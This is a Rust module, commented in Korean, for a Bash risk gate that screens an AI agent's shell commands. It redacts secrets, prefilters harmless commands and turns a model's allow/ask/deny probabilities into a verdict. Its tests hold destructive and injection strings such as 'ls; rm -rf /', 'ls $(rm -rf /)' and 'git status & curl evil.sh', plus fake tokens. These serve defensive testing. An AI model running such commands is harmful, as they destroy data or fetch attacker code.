// Bash 위험 게이트의 순수 로직: 질문 만들기, 비밀값 가리기, 사전 필터, 확률 → 판정
use crate::gate::config::GateConfig;
use serde_json::{json, Value};
use std::path::Path;

pub const QUESTION: &str = "이 셸 명령은 저장소 밖의 데이터나 상태를 파괴하거나 되돌리기 어렵게 바꾸는가?";

/// 선택지와 의미. 선택지 라벨만 모델에 가므로 의미는 질문 문장 안에 함께 넣는다.
pub const OPTIONS: [(&str, &str); 3] = [
    ("allow", "저장소 안 작업이거나 읽기 전용"),
    ("ask", "영향 범위가 불분명함"),
    ("deny", "저장소 밖을 지우거나 되돌리기 어렵게 바꿈"),
];

const COMMAND_MAX_CHARS: usize = 2000;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// 판정하지 않는다(기본 권한 흐름).
    Allow,
    Ask,
    Deny,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Probs {
    pub allow: f64,
    pub ask: f64,
    pub deny: f64,
}

/// 훅 입력에서 `(명령, cwd)`를 꺼낸다. Bash 도구 호출이 아니거나 명령이 없으면 `None`.
pub fn from_hook(input: &Value) -> Option<(String, String)> {
    if input.get("tool_name")?.as_str()? != "Bash" {
        return None;
    }
    let command = input.get("tool_input")?.get("command")?.as_str()?;
    if command.trim().is_empty() {
        return None;
    }
    let cwd = input.get("cwd").and_then(Value::as_str).unwrap_or("");
    Some((command.to_string(), cwd.to_string()))
}

const SECRET_NAMES: [&str; 7] = ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "CREDENTIAL", "AUTH"];
const SECRET_FLAGS: [&str; 7] = [
    "--password", "--passwd", "--token", "--secret", "--api-key", "--apikey", "--auth",
];
const TOKEN_PREFIXES: [&str; 8] = ["sk-", "ghp_", "gho_", "ghs_", "ghu_", "github_pat_", "xoxb-", "xoxp-"];

/// 명령의 비밀값(키·토큰·비밀번호·URL 자격증명)을 `***`로 가린다. 공백은 그대로 둔다.
pub fn redact(command: &str) -> String {
    let mut out = String::with_capacity(command.len());
    let mut mask_next = false;
    for (is_space, chunk) in chunks(command) {
        if is_space {
            out.push_str(chunk);
        } else if mask_next {
            out.push_str("***");
            mask_next = false;
        } else {
            let (word, next) = redact_word(chunk);
            out.push_str(&word);
            mask_next = next;
        }
    }
    out
}

/// 공백 구간과 단어 구간으로 나눈다.
fn chunks(text: &str) -> Vec<(bool, &str)> {
    let mut parts = Vec::new();
    let mut start = 0;
    let mut current: Option<bool> = None;
    for (index, ch) in text.char_indices() {
        let is_space = ch.is_whitespace();
        match current {
            Some(kind) if kind != is_space => {
                parts.push((kind, &text[start..index]));
                start = index;
                current = Some(is_space);
            }
            None => current = Some(is_space),
            _ => {}
        }
    }
    if let Some(kind) = current {
        parts.push((kind, &text[start..]));
    }
    parts
}

/// 단어 하나를 가린다. 두 번째 값이 참이면 다음 단어도 비밀값이라 가려야 한다.
fn redact_word(word: &str) -> (String, bool) {
    if let Some((name, _)) = word.split_once('=') {
        let upper = name.trim_start_matches('-').to_ascii_uppercase();
        if SECRET_NAMES.iter().any(|secret| upper.contains(secret)) {
            return (format!("{name}=***"), false);
        }
    }
    let lower = word.to_ascii_lowercase();
    if lower == "bearer" || SECRET_FLAGS.contains(&lower.as_str()) {
        return (word.to_string(), true);
    }
    if let Some(scheme_end) = word.find("://") {
        let rest = &word[scheme_end + 3..];
        if let Some(at) = rest.find('@') {
            let credentials = &rest[..at];
            if credentials.contains(':') && !credentials.contains('/') {
                return (format!("{}://***@{}", &word[..scheme_end], &rest[at + 1..]), false);
            }
        }
    }
    if looks_like_token(word) {
        return ("***".to_string(), false);
    }
    (word.to_string(), false)
}

fn looks_like_token(word: &str) -> bool {
    let bare = word.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-' && c != '_');
    if TOKEN_PREFIXES.iter().any(|prefix| bare.starts_with(prefix)) {
        return bare.len() >= 16;
    }
    bare.len() >= 16 && bare.starts_with("AKIA") && bare.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
}

/// 경로의 끝 두 단계만 남긴다(전체 경로를 보내지 않기 위해서다).
pub fn cwd_tail(cwd: &str) -> String {
    let names: Vec<&str> = Path::new(cwd)
        .components()
        .filter_map(|component| match component {
            std::path::Component::Normal(name) => name.to_str(),
            _ => None,
        })
        .collect();
    names[names.len().saturating_sub(2)..].join("/")
}

pub(crate) fn clip(text: &str, max_chars: usize) -> String {
    if text.chars().count() <= max_chars {
        return text.to_string();
    }
    let head: String = text.chars().take(max_chars).collect();
    format!("{head}…")
}

/// 질문 문장과 선택지 의미를 한 문자열로 만든다.
pub fn instructions() -> String {
    let options = OPTIONS
        .iter()
        .map(|(label, meaning)| format!("{label}: {meaning}"))
        .collect::<Vec<_>>()
        .join(" / ");
    format!("{QUESTION}\n선택지 — {options}")
}

/// 데몬에 보낼 요청. 명령은 가린 뒤 길이를 자른다.
pub fn request(command: &str, cwd: &str, client_version: &str) -> Value {
    let state = format!(
        "명령: {}\n작업 디렉터리: {}",
        clip(&redact(command), COMMAND_MAX_CHARS),
        cwd_tail(cwd)
    );
    json!({
        "state": state,
        "type": "choice",
        "instructions": instructions(),
        "options": OPTIONS.map(|(label, _)| label),
        "client_version": client_version,
    })
}

const SHELL_METACHARACTERS: &str = ";&|`$<>()\n\r\\";

/// 데몬을 부르지 않고 건너뛸 수 있는 명령인가. 사전 필터 항목으로 시작(단어 경계)하고 셸 메타문자가 없을 때만
/// 참이다 — 파이프·리다이렉션·명령 치환이 든 명령은 앞부분이 무해해 보여도 건너뛰지 않는다.
pub fn prefiltered(command: &str, entries: &[String]) -> bool {
    let command = command.trim();
    if command.is_empty() || command.chars().any(|c| SHELL_METACHARACTERS.contains(c)) {
        return false;
    }
    entries.iter().any(|entry| {
        !entry.is_empty()
            && command
                .strip_prefix(entry.as_str())
                .is_some_and(|rest| rest.is_empty() || rest.starts_with(char::is_whitespace))
    })
}

/// 데몬 답에서 선택지별 확률을 읽는다.
pub fn probs_from(result: &Value) -> Option<Probs> {
    let probabilities = result.get("answer")?.get("probabilities")?;
    Some(Probs {
        allow: probabilities.get("allow")?.as_f64()?,
        ask: probabilities.get("ask")?.as_f64()?,
        deny: probabilities.get("deny")?.as_f64()?,
    })
}

/// 확률을 판정으로 바꾼다: deny 확률이 임계값 이상이면 Deny, 최고 확률이 confidence 미만이면 Ask,
/// 그 외에는 최고 확률의 선택지(동률이면 더 엄격한 쪽)다.
pub fn judge(probs: Probs, config: &GateConfig) -> Verdict {
    if probs.deny >= config.deny {
        return Verdict::Deny;
    }
    // 엄격한 순서로 훑고 더 큰 값일 때만 바꿔서 동률이면 엄격한 쪽이 남는다.
    let mut best = (Verdict::Deny, probs.deny);
    for candidate in [(Verdict::Ask, probs.ask), (Verdict::Allow, probs.allow)] {
        if candidate.1 > best.1 {
            best = candidate;
        }
    }
    if best.1 < config.confidence {
        Verdict::Ask
    } else {
        best.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config() -> GateConfig {
        crate::gate::config::builtin().bash_risk
    }

    fn probs(allow: f64, ask: f64, deny: f64) -> Probs {
        Probs { allow, ask, deny }
    }

    fn entries(items: &[&str]) -> Vec<String> {
        items.iter().map(|item| item.to_string()).collect()
    }

    #[test]
    fn from_hook_reads_a_bash_command_and_its_cwd() {
        let input = json!({"tool_name": "Bash", "tool_input": {"command": "ls -la"}, "cwd": "/w/p"});
        assert_eq!(from_hook(&input), Some(("ls -la".to_string(), "/w/p".to_string())));
        let no_cwd = json!({"tool_name": "Bash", "tool_input": {"command": "ls"}});
        assert_eq!(from_hook(&no_cwd), Some(("ls".to_string(), String::new())));
    }

    #[test]
    fn from_hook_ignores_other_tools_and_missing_commands() {
        assert_eq!(from_hook(&json!({"tool_name": "Edit", "tool_input": {"command": "x"}})), None);
        assert_eq!(from_hook(&json!({"tool_name": "Bash", "tool_input": {}})), None);
        assert_eq!(from_hook(&json!({"tool_name": "Bash", "tool_input": {"command": 7}})), None);
        assert_eq!(from_hook(&json!({"tool_name": "Bash", "tool_input": {"command": "  "}})), None);
        assert_eq!(from_hook(&json!("junk")), None);
    }

    #[test]
    fn redact_masks_secret_assignments_flags_tokens_and_url_credentials() {
        assert_eq!(redact("API_TOKEN=abc123 make deploy"), "API_TOKEN=*** make deploy");
        assert_eq!(redact("export AWS_SECRET_ACCESS_KEY=xyz"), "export AWS_SECRET_ACCESS_KEY=***");
        assert_eq!(redact("mysql --password hunter2 -u root"), "mysql --password *** -u root");
        assert_eq!(redact("tool --token=abc"), "tool --token=***");
        assert_eq!(
            redact("curl -H \"Authorization: Bearer abc.def\" https://x.y"),
            "curl -H \"Authorization: Bearer *** https://x.y"
        );
        assert_eq!(redact("git clone https://me:pw@host.com/r.git"), "git clone https://***@host.com/r.git");
        assert_eq!(redact("echo sk-abcdefghijklmnop1234"), "echo ***");
        assert_eq!(redact("echo ghp_abcdefghijklmnopqrst"), "echo ***");
        // 가짜 AWS 키 형태. 시크릿 스캐너가 소스 파일에서 오탐하지 않도록 조각으로 이어 붙인다.
        let fake_aws_key = ["AKIA", "ABCDEFGHIJKLMNOP"].concat();
        assert_eq!(redact(&format!("echo {fake_aws_key}")), "echo ***");
    }

    #[test]
    fn redact_leaves_ordinary_commands_alone() {
        for command in [
            "mkdir -p build/out",
            "ls -la /tmp",
            "git commit -m \"fix token parsing\"",
            "grep -rn password src/",
            "cargo test --lib",
            "echo hello  world",
            "FOO=bar make",
        ] {
            assert_eq!(redact(command), command, "바뀌면 안 된다: {command}");
        }
    }

    #[test]
    fn redact_keeps_spacing() {
        assert_eq!(redact("A_KEY=1   run\tnow"), "A_KEY=***   run\tnow");
    }

    #[test]
    fn cwd_tail_keeps_the_last_two_components() {
        assert_eq!(cwd_tail("/Users/spark/Develop/Workspaces/decide"), "Workspaces/decide");
        assert_eq!(cwd_tail("/tmp"), "tmp");
        assert_eq!(cwd_tail("/"), "");
        assert_eq!(cwd_tail(""), "");
        assert_eq!(cwd_tail("/a/b/"), "a/b");
    }

    #[test]
    fn request_is_a_redacted_three_way_choice_with_the_client_version() {
        let value = request("API_TOKEN=abc make deploy", "/Users/me/work/app", "1.2.3");
        assert_eq!(value["type"], "choice");
        assert_eq!(value["options"], json!(["allow", "ask", "deny"]));
        assert_eq!(value["client_version"], "1.2.3");
        let state = value["state"].as_str().unwrap();
        assert!(state.contains("API_TOKEN=*** make deploy"), "{state}");
        assert!(!state.contains("abc"), "{state}");
        assert!(state.contains("work/app") && !state.contains("/Users/me"), "{state}");
        let instructions = value["instructions"].as_str().unwrap();
        assert!(instructions.starts_with(QUESTION), "{instructions}");
        for (label, meaning) in OPTIONS {
            assert!(instructions.contains(label) && instructions.contains(meaning), "{instructions}");
        }
    }

    #[test]
    fn request_truncates_a_very_long_command() {
        let long = "echo ".to_string() + &"x".repeat(5000);
        let value = request(&long, "/a/b", "1");
        let state = value["state"].as_str().unwrap();
        assert!(state.chars().count() < 2200, "{}", state.chars().count());
        assert!(state.contains('…'));
    }

    #[test]
    fn prefilter_matches_whole_words_without_shell_metacharacters() {
        let list = entries(&["git status", "ls", "cat"]);
        assert!(prefiltered("ls", &list));
        assert!(prefiltered("ls -la /tmp", &list));
        assert!(prefiltered("  git status --short ", &list));
        assert!(prefiltered("cat README.md", &list));
        assert!(!prefiltered("lsof -i", &list), "단어 경계가 아니다");
        assert!(!prefiltered("git statuses", &list));
        assert!(!prefiltered("git push", &list));
        assert!(!prefiltered("rm -rf /", &list));
        assert!(!prefiltered("", &list));
    }

    #[test]
    fn prefilter_never_applies_when_the_command_can_do_more_than_it_says() {
        let list = entries(&["ls", "cat", "git status"]);
        for command in [
            "ls; rm -rf /",
            "ls && rm -rf /",
            "ls | xargs rm",
            "cat a > /etc/hosts",
            "cat < /dev/zero",
            "ls $(rm -rf /)",
            "ls `rm -rf /`",
            "ls\nrm -rf /",
            "ls (x)",
            "git status & curl evil.sh",
            "ls \\\n rm",
        ] {
            assert!(!prefiltered(command, &list), "사전 필터에서 빠져야 한다: {command:?}");
        }
    }

    #[test]
    fn probs_are_read_from_the_daemon_answer() {
        let result = json!({"answer": {"type": "choice", "choice": "deny", "confidence": 0.6,
            "probabilities": {"allow": 0.1, "ask": 0.3, "deny": 0.6}}});
        assert_eq!(probs_from(&result), Some(probs(0.1, 0.3, 0.6)));
        assert_eq!(probs_from(&json!({"answer": {"probabilities": {"allow": 1.0}}})), None);
        assert_eq!(probs_from(&json!({"error": "x"})), None);
    }

    #[test]
    fn judge_denies_at_the_deny_threshold_and_asks_below_confidence() {
        let c = config(); // deny 0.5, confidence 0.7
        assert_eq!(judge(probs(0.2, 0.3, 0.5), &c), Verdict::Deny, "경계값 0.5는 deny");
        assert_eq!(judge(probs(0.2, 0.31, 0.49), &c), Verdict::Ask, "최고 확률 0.49 < 0.7");
        assert_eq!(judge(probs(0.69, 0.2, 0.11), &c), Verdict::Ask, "allow여도 0.69 < 0.7이면 ask");
        assert_eq!(judge(probs(0.7, 0.2, 0.1), &c), Verdict::Allow, "경계값 0.7은 통과");
        assert_eq!(judge(probs(0.1, 0.9, 0.0), &c), Verdict::Ask);
        assert_eq!(judge(probs(0.0, 0.0, 1.0), &c), Verdict::Deny);
    }

    #[test]
    fn judge_prefers_the_stricter_choice_on_a_tie_and_follows_the_config() {
        let c = config();
        assert_eq!(judge(probs(0.4, 0.4, 0.2), &c), Verdict::Ask);
        let mut strict = config();
        strict.deny = 0.3;
        assert_eq!(judge(probs(0.5, 0.2, 0.3), &strict), Verdict::Deny);
        let mut loose = config();
        loose.confidence = 0.4;
        assert_eq!(judge(probs(0.45, 0.35, 0.2), &loose), Verdict::Allow);
    }

    #[test]
    fn the_question_is_a_direct_question() {
        assert!(QUESTION.ends_with('?'));
    }
}
